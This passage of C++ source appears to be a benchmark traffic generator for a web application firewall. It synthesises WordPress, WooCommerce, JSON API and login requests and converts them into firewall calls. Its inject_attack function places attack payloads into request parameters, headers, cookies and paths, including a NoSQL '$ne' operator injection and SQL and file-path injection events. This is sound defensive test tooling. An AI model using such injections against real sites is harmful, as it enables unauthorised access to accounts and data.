    req.body.set("action", r.pick(std::vector<std::string>{"woocommerce_add_to_cart",
                               "heartbeat", "load_more_posts", "wc_get_refreshed_fragments"}));
    req.body.set("_wpnonce", r.hex(10));
    req.body.set("product_id", std::to_string(r.range(1, 9999)));
    req.body.set("quantity", std::to_string(r.range(1, 5)));
    if (r.chance(1, 2)) { req.body.set("page", std::to_string(r.range(1, 10))); }
    json_response_headers(r, req);
    req.resp_body = node::map();
    req.resp_body.set("success", node::boolean(true));
    auto &d = req.resp_body.set("data", node::map());
    d.set("cart_hash", r.hex(32));
    d.set("count", node::integer(r.range(1, 10)));
    for (int64_t i = 0; i < r.range(1, 3); ++i) {
        req.rasp.push_back(sql_event(wp_sql(r, slug(r), "")));
    }
}

void json_api(rng &r, http_request &req, bool large)
{
    req.method = r.chance(3, 4) ? "POST" : "PUT";
    req.body_raw_type = "application/json";
    const auto id = std::to_string(r.range(1, 999999));
    if (!large) {
        req.path = "/api/v1/users/" + id + "/preferences";
        req.route_params = node::map();
        req.route_params.set("user", id);
        req.body.set("theme", r.chance(1, 2) ? "dark" : "light");
        req.body.set("language", "en");
        req.body.set("timezone", "Europe/Paris");
        auto &n = req.body.set("notifications", node::map());
        n.set("email", node::boolean(r.chance(1, 2)));
        n.set("sms", node::boolean(r.chance(1, 2)));
        n.set("push", node::boolean(r.chance(1, 2)));
        req.body.set("display_name", r.pick(first_names) + " " + r.pick(last_names));
        req.body.set("bio", sentence(r, static_cast<std::size_t>(r.range(5, 20))));
        json_response_headers(r, req);
        req.resp_body = node::map();
        auto &d = req.resp_body.set("data", node::map());
        d.set("id", node::integer(std::stoll(id)));
        d.set("updated", node::boolean(true));
        d.set("updated_at", "2024-06-03T10:12:44Z");
        for (int64_t i = 0; i < r.range(1, 4); ++i) { req.rasp.push_back(sql_event(laravel_sql(r))); }
        return;
    }

    // Large: e-commerce order submission
    req.path = "/api/v2/orders";
    auto &order = req.body.set("order", node::map());
    order.set("client_order_id", r.uuid());
    auto &cust = order.set("customer", node::map());
    cust.set("id", node::integer(r.range(1, 999999)));
    cust.set("email", email(r));
    cust.set("first_name", r.pick(first_names));
    cust.set("last_name", r.pick(last_names));
    cust.set("phone", "+33 6 " + std::to_string(r.range(10, 99)) + " " +
                          std::to_string(r.range(10, 99)) + " " + std::to_string(r.range(10, 99)) +
                          " " + std::to_string(r.range(10, 99)));
    for (const char *kind : {"billing_address", "shipping_address"}) {
        auto &a = cust.set(kind, node::map());
        a.set("line1", std::to_string(r.range(1, 200)) + " rue " + r.pick(words));
        a.set("line2", "Apt " + std::to_string(r.range(1, 99)));
        a.set("city", "Paris");
        a.set("postal_code", std::to_string(r.range(75001, 75020)));
        a.set("country", "FR");
    }
    auto &items = order.set("items", node::array());
    const auto n_items = r.range(40, 90);
    for (int64_t i = 0; i < n_items; ++i) {
        node it = product(r, r.range(1, 999999), true);
        it.set("quantity", node::integer(r.range(1, 5)));
        it.set("gift_message", r.chance(1, 5) ? sentence(r, 10) : "");
        items.add(std::move(it));
    }
    order.set("notes", paragraph(r, static_cast<std::size_t>(r.range(1000, 6000))));
    auto &meta = order.set("metadata", node::map());
    for (int64_t i = 0; i < r.range(20, 50); ++i) {
        meta.set("meta_" + r.pick(words) + "_" + std::to_string(i), r.alnum(r.range(4, 40)));
    }
    order.set("payment_method_token", "tok_" + r.alnum(24));
    order.set("signature", r.base64(r.range(2000, 5000)));
    order.set("coupon_codes", node::array()).add(node::str(r.alnum(8)));

    json_response_headers(r, req);
    req.status = "201";
    req.resp_body = node::map();
    auto &data = req.resp_body.set("data", node::array());
    for (int64_t i = 0; i < r.range(60, 100); ++i) { data.add(product(r, r.range(1, 999999), true)); }
    auto &m = req.resp_body.set("meta", node::map());
    m.set("page", node::integer(1));
    m.set("per_page", node::integer(100));
    m.set("total", node::integer(r.range(100, 9999)));

    for (int64_t i = 0; i < r.range(8, 15); ++i) { req.rasp.push_back(sql_event(laravel_sql(r))); }
    for (int64_t i = 0; i < r.range(1, 3); ++i) { req.rasp.push_back(file_event(r.pick(php_files))); }
    req.rasp.push_back(url_event(r.pick(outbound_urls)));
}

void form_post_large(rng &r, http_request &req)
{
    // WordPress post editor submission
    req.method = "POST";
    req.path = "/wp-admin/post.php";
    req.body_raw_type = "application/x-www-form-urlencoded";
    auto &b = req.body;
    const auto post_id = std::to_string(r.range(1, 90000));
    b.set("_wpnonce", r.hex(10));
    b.set("_wp_http_referer", "/wp-admin/post.php?post=" + post_id + "&action=edit");
    b.set("user_ID", std::to_string(r.range(1, 50)));
    b.set("action", "editpost");
    b.set("originalaction", "editpost");
    b.set("post_author", std::to_string(r.range(1, 50)));
    b.set("post_type", "post");
    b.set("original_post_status", "draft");
    b.set("post_ID", post_id);
    b.set("post_title", sentence(r, 8));
    std::string content;
    while (content.size() < 7000) {
        content += "<p>" + paragraph(r, static_cast<std::size_t>(r.range(200, 800))) + "</p>\n";
        if (r.chance(1, 3)) { content += "<h2>" + sentence(r, 5) + "</h2>\n"; }
        if (r.chance(1, 4)) {
            content += "<p><strong>" + sentence(r, 6) + "</strong> " + sentence(r, 12) + "</p>\n";
        }
    }
    b.set("content", content);
    b.set("excerpt", paragraph(r, 300));
    b.set("post_name", slug(r));
    b.set("post_status", "publish");
    b.set("visibility", "public");
    auto &tax = b.set("tax_input", node::map());
    auto &cats = tax.set("category", node::array());
    for (int64_t i = 0; i < r.range(1, 6); ++i) { cats.add(node::str(std::to_string(r.range(1, 300)))); }
    tax.set("post_tag", join_words(r, 8, ','));
    auto &meta = b.set("meta", node::array());
    for (int64_t i = 0; i < r.range(30, 80); ++i) {
        auto &m = meta.add(node::map());
        m.set("key", "_" + r.pick(words) + "_" + r.pick(words));
        m.set("value", r.chance(1, 3) ? paragraph(r, 120) : r.alnum(r.range(1, 30)));
    }
    for (int64_t i = 0; i < r.range(40, 100); ++i) {
        b.set("acf_field_" + r.hex(13), r.chance(1, 2) ? sentence(r, 6) : std::to_string(r.range(0, 9999)));
    }
    html_response(r, req, true);
    req.status = "302";
    req.resp_headers.set("location", node::array())
        .add(node::str("https://" + req.host + "/wp-admin/post.php?post=" + post_id +
                       "&action=edit&message=1"));
    for (int64_t i = 0; i < r.range(10, 20); ++i) { req.rasp.push_back(sql_event(wp_sql(r, slug(r), ""))); }
    for (int64_t i = 0; i < r.range(2, 4); ++i) { req.rasp.push_back(file_event(r.pick(php_files))); }
}

void login_post(rng &r, http_request &req, const traffic_options &opts, bool &blocked_user)
{
    req.method = "POST";
    req.path = "/login";
    req.body_raw_type = "application/x-www-form-urlencoded";
    const std::string login = email(r);
    req.body.set("_token", r.alnum(40));
    req.body.set("email", login);
    req.body.set("password", r.alnum(r.range(10, 20)));
    req.body.set("remember", "on");
    html_response(r, req, false);
    req.status = "302";
    req.resp_headers.set("location", node::array()).add(node::str("https://" + req.host + "/account"));
    req.rasp.push_back(sql_event("select * from `users` where `email` = ? limit 1"));

    std::string user_id = std::to_string(r.range(1, 999999999));
    if (opts.blocked_user_one_in != 0 && !opts.blocked_users.empty() &&
        r.chance(1, opts.blocked_user_one_in)) {
        user_id = r.pick(opts.blocked_users);
        blocked_user = true;
    }
    node ev = node::map();
    ev.set("server.business_logic.users.login.success", node::null());
    ev.set("usr.login", login);
    ev.set("usr.id", user_id);
    req.login_at = req.rasp.size();
    req.rasp.push_back(std::move(ev));
    req.rasp.push_back(sql_event(
        "update `users` set `remember_token` = ?, `users`.`updated_at` = ? where `id` = ?"));
}

// ---------------------------------------------------------------------------
// Attack injection
// ---------------------------------------------------------------------------

void inject_attack(rng &r, http_request &req)
{
    const attack &a = r.pick(attacks);
    const std::string payload = a.payload;
    std::string param = r.pick(std::vector<std::string>{"id", "q", "file", "page", "url", "redirect",
        "cmd", "template", "lang", "user"});
    bool in_params = false; // reachable by RASP detectors (query/body/path params)
    if (a.kind == attack_kind::nosql) {
        // PHP turns password[$ne]=x into a nested map
        node op = node::map();
        op.set("$ne", "");
        (req.method != "GET" ? req.body : req.query).set("password", std::move(op));
        return;
    }
    switch (r.below(6)) {
    case 0:
    case 1:
        req.query.set(param, payload);
        in_params = true;
        break;
    case 2:
        if (req.method != "GET") {
            req.body.set(param, payload);
            in_params = true;
        } else {
            req.query.set(param, payload);
            in_params = true;
        }
        break;
    case 3:
        req.headers.set(r.chance(1, 2) ? "referer" : "x-api-version", payload);
        break;
    case 4:
        req.cookies.set(r.chance(1, 2) ? "lang" : "tracking_" + r.alnum(4), url_encode(payload));
        break;
    default:
        req.path += (req.path.back() == '/' ? "" : "/") + url_encode(payload);
        in_params = true; // ends up in server.request.path_params
        break;
    }

    // RASP exploitation of the injected value
    if (in_params && r.chance(1, 2)) {
        switch (a.kind) {
        case attack_kind::sqli:
            req.rasp.push_back(
                sql_event("SELECT * FROM products WHERE id = " + payload + " LIMIT 1"));
            break;
        case attack_kind::lfi:
        case attack_kind::php:
            req.rasp.push_back(file_event("/var/www/html/pages/" + payload));
            break;
        case attack_kind::ssrf:
            req.rasp.push_back(url_event(payload));
            break;
        default:
            break;
        }
    }
}

// ---------------------------------------------------------------------------
// Conversion to WAF calls
// ---------------------------------------------------------------------------

request_spec to_spec(http_request &req)
{
    request_spec spec;

    std::string uri = req.path;
    std::string qs;
    append_query_string(qs, "", req.query);
    if (!qs.empty()) { uri += "?" + qs; }

    if (!req.body_raw_type.empty()) {
        req.headers.set("content-type", req.body_raw_type);
        req.headers.set("content-length", std::to_string(to_json(req.body).size()));
    }

    // Limits shared between query, cookies and body; separate for headers.
    php_limits shared;
    apply_limits(req.query, shared);
    apply_limits(req.cookies, shared);
    apply_limits(req.body, shared);
    php_limits header_lim;
    apply_limits(req.headers, header_lim);
    if (uri.size() > php_limits::max_string_length) { uri.resize(php_limits::max_string_length); }

    node init = node::map();
    init.set("server.request.query", std::move(req.query));
    init.set("server.request.method", req.method);
    init.set("server.request.cookies", std::move(req.cookies));
    init.set("server.request.uri.raw", uri);
    init.set("server.request.headers.no_cookies", std::move(req.headers));
    init.set("server.request.body", req.body.is_null_like() ? node::map() : std::move(req.body));
    init.set("server.request.body.filenames", std::move(req.filenames));
    init.set("server.request.body.files_field_names", std::move(req.file_fields));
    init.set("server.request.path_params", path_params_of(uri));
    init.set("http.client_ip", req.client_ip);
    spec.steps.push_back({false, std::move(init)});

    if (req.route_params.is_map()) {
        node rp = node::map();
        rp.set("server.request.path_params", std::move(req.route_params));
        spec.steps.push_back({false, std::move(rp)});
    }

    for (auto &ev : req.rasp) { spec.steps.push_back({true, std::move(ev)}); }

    node resp = node::map();
    resp.set("server.response.status", req.status);
    resp.set("server.response.headers.no_cookies", std::move(req.resp_headers));
    if (!req.resp_body.is_null_like()) {
        php_limits resp_lim;
        apply_limits(req.resp_body, resp_lim);
        resp.set("server.response.body", std::move(req.resp_body));
    }
    if (req.schema) {
        auto &p = resp.set("waf.context.processor", node::map());
        p.set("extract-schema", node::boolean(true));
    }
    spec.steps.push_back({false, std::move(resp)});
    return spec;
}

} // namespace

std::vector<request_spec> generate_traffic(const traffic_options &opts)
{
    rng r{opts.seed};
    std::vector<request_spec> out;
    out.reserve(opts.count);

    for (std::size_t idx = 0; idx < opts.count; ++idx) {
        http_request req;
        req.host = r.pick(hosts);
        bool blocked = false;
        req.client_ip = r.chance(1, 8) ? public_ipv6(r) : public_ipv4(r);
        if (opts.blocked_ip_one_in != 0 && !opts.blocked_ips.empty() &&
            r.chance(1, opts.blocked_ip_one_in)) {
            req.client_ip = r.pick(opts.blocked_ips);
            blocked = true;
        }

        const bool large = opts.mix == traffic_mix::large;
        bool blocked_user = false;
        const bool login = opts.login_one_in != 0 && r.chance(1, opts.login_one_in) &&
                           opts.mix != traffic_mix::large;

        if (login) {
            base_headers(r, req, true, false);
            base_cookies(r, req, false);
            login_post(r, req, opts, blocked_user);
        } else {
            switch (opts.mix) {
            case traffic_mix::small:
            case traffic_mix::attack: {
                const auto kind = r.below(20);
                if (kind < 13) {
                    base_headers(r, req, true, false);
                    base_cookies(r, req, false);
                    page_get(r, req, false);
                } else if (kind < 16) {
                    base_headers(r, req, false, false);
                    base_cookies(r, req, false);
                    ajax_post(r, req);
                } else {
                    base_headers(r, req, false, false);
                    base_cookies(r, req, false);
                    json_api(r, req, false);
                }
                break;
            }
            case traffic_mix::large: {
                const auto kind = r.below(10);
                if (kind < 5) {
                    base_headers(r, req, false, true);
                    base_cookies(r, req, true);
                    json_api(r, req, true);
                } else if (kind < 8) {
                    base_headers(r, req, true, true);
                    base_cookies(r, req, true);
                    form_post_large(r, req);
                } else {
                    base_headers(r, req, true, true);
                    base_cookies(r, req, true);
                    page_get(r, req, true);
                }
                break;
            }
            case traffic_mix::rasp_heavy: {
                base_headers(r, req, true, false);
                base_cookies(r, req, false);
                page_get(r, req, false);
                // A WooCommerce / WordPress home page: dozens of queries.
                const std::string sv = slug(r);
                for (int64_t i = 0; i < r.range(30, 60); ++i) {
                    req.rasp.push_back(sql_event(wp_sql(r, sv, "")));
                }
                for (int64_t i = 0; i < r.range(4, 8); ++i) {
                    req.rasp.push_back(file_event(r.pick(php_files)));
                }
                for (int64_t i = 0; i < r.range(1, 2); ++i) {
                    req.rasp.push_back(url_event(r.pick(outbound_urls)));
                }
                break;
            }
            }
        }

        const bool attack = opts.mix == traffic_mix::attack;
        if (attack) {
            if (r.chance(1, 5)) { req.headers.set("user-agent", r.pick(scanner_uas)); }
            const auto n = r.range(1, 3);
            for (int64_t i = 0; i < n; ++i) { inject_attack(r, req); }
        }

        // API security sampling: one schema extraction per endpoint every 30s,
        // i.e. a small fraction of requests.
        req.schema = r.chance(1, large ? 8 : 16);

        request_spec spec = to_spec(req);
        spec.attack = attack;
        spec.expect_block = blocked || blocked_user;
        out.push_back(std::move(spec));
    }
    return out;
}

} // namespace bench
